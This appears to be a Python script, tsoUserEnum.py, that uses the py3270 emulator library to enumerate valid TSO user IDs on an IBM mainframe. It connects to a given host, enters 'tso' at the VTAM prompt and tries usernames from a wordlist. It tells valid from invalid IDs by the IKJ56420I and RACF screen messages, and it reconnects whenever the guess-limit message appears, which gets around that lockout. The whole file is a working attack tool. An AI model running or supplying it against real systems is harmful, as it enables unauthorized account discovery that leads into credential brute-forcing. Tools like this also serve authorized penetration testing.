from py3270 import Emulator
import sys
import time

if len(sys.argv) <= 3:
	print("Usage: tsoUserEnum.py <host> <port> <path to user list>")
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]
user_list_location = sys.argv[3]

delay_time = 0.1

def file2list(filename):
	lines = []
	with open(filename) as file:
    		lines = file.readlines()
    		lines = [line.rstrip() for line in lines]
	return lines
	
def user_enum(count, users, number_of_users):
	# use x3270 so you can see what is going on
	#em = Emulator(visible=True)

	# or not (uses s3270)
	em = Emulator()

	# connect to host
	em.connect('%s:%d' % (host, int(port)))
	em.wait_for_field()
	time.sleep(delay_time)
	#print("[i] Connected to host")

	# enter 'tso' at the VTAM prompt
	em.fill_field(21, 22, 'tso', 3)
	em.send_enter()
	em.wait_for_field()
	time.sleep(delay_time)
	
	# user enumeration loop
	while count < number_of_users:
		em.send_string(users[count], None, None)
		em.send_enter()
		em.wait_for_field()
		time.sleep(delay_time)
		# check for IKJ56420I message
		message = em.string_get(2,2, 9)
		#print("[i] Message: ", message)
		if em.string_found(2, 2, 'IKJ56420I'):
			#print("[-] User: " + users[count] + " is not valid")
			None
		elif em.string_found(2, 2, 'IKJ56428I'):
			#print("[i] Guesses exceeded, logging back in")
			em.terminate()
			return count  
		elif em.string_found(4, 53, 'RACF'):
			print("[" + str(count+1) + "] User: " + users[count] + " is valid")
			#print("[i] Logging back in")
			em.terminate()
			count += 1
			return count  
		else:
			#print("[-] User: " + users[count] + " is not valid")
			None
		count += 1
		#print("["+str(count)+"]")
	# disconnect from host and kill subprocess
	em.terminate()
	return count

# define a list of users
users = file2list(user_list_location)
number_of_users = len(users)

progress = 0

print("[i] Attempting to enumerate " + str(number_of_users) + " users")

while progress < number_of_users:
	progress = user_enum(progress, users, number_of_users)

